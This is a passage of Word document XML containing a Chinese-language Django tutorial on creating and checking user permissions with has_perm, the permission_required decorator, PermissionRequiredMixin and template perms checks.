    <w:p w14:paraId="7C49F021" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    user.has_perm('myapp.change_blogpost') </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C2DA91" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2843D45B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    content_type = ContentType.objects.get_for_model(BlogPost)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE1EA64" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    permission = Permission.objects.get(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D49E44" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        codename='change_blogpost',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5638B7A5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        content_type=content_type,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F4B5E9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36EA8804" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    user.user_permissions.add(permission)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27DC3D7A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77C8AA96" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # Checking the cached permission set</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43644857" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    user.has_perm('myapp.change_blogpost')  # False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B3E835" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E0BC39D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # Request new instance of User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DFB5F06" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # Be aware that user.refresh_from_db() won't clear the cache.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C3D6F46" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    user = get_object_or_404(User, pk=user_id)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C2A6A1C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="196DF398" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # Permission cache is repopulated from the database</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4366F70D" w14:textId="42357FA0" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    user.has_perm('myapp.change_blogpost')  # True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60207B59" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="110EE0C3" w14:textId="54A158B8" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>用户权限的验证(Validation)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D1505E" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们前面讲解了用户权限的创建和设置，现在我们将进入关键一环，用户权限的验证。我们在分配好权限后，我们还需要在视图views.py和模板里验证用户是否具有相应的权限，否则前面设置的权限形同虚设。这就是为什么我们前面很多django实战案例里，没有给用户分配某个模型的add和change权限，用户还是还能创建和编辑对象的原因。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3304CA1D" w14:textId="4B6EED4D" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59CA9B92" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>1. 视图中验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CBF0322" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在视图中你当然可以使用user.has_perm方法对一个用户的权限进行直接验证。当然一个更好的方法是使用@permission_required这个装饰器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E81A0C" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>permission_required(</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>perm</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>login_url=None</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>raise_exception=False</w:t>
      </w:r>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="213C3160" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>你如果指定了login_url, 用户会被要求先登录。如果你设置了raise_exception=True, 会直接返回403无权限的错误，而不会跳转到登录页面。使用方法如下所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6499D5" w14:textId="56BE110F" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.decorators import permission_required</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F23A390" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>@permission_required('polls.can_vote')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="017CE361" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def my_view(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D3F02C0" w14:textId="0546A036" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15592F2F" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果你使用基于类的视图(Class Based View), 而不是函数视图，你需要继承PermissionRequiredMixin这个类，如下所示:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0D3FFB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.mixins import PermissionRequiredMixin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FE97A79" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F8D79BF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class MyView(PermissionRequiredMixin, View):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068FF33E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    permission_required = 'polls.can_vote'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72588994" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    # Or multiple of permissions:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1973D0BA" w14:textId="5B735389" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    permission_required = ('polls.can_open', 'polls.can_edit')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B1B4152" w14:textId="49A2F8AA" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FA5A0C9" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2. 模板中验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00160921" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在模板中验证用户权限主要需要学会使用perms这个全局变量。perms对当前用户的user.has_module_perms和user.has_perm方法进行了封装。当我们需要判断当前用户是否拥有blog应用下的所有权限时，我们可以使用:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6868DCC0" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{{ perms.blog }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E9A093" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们如果判断当前用户是否拥有blog应用下发表文章讨论的权限，则使用:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32C1DAF4" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{{ perms.blog.comment_article }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F99B48" w14:textId="77777777" w:rsidR="00230D30" w:rsidRPr="00230D30" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>这样结合template的if标签，我们可以通过判断当前用户所具有的权限，显示不同的内容了.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F83F3BE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5531B8DB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% if blog.article %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2504BA10" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;p&gt;You have permission to do something in this blog app.&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="033AB193" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    {% if perms.blog.add_article %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0997A686" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00230D30">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        &lt;p&gt;You can add articles.&lt;/p&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2928A6C7" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00230D30" w:rsidP="00230D30">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
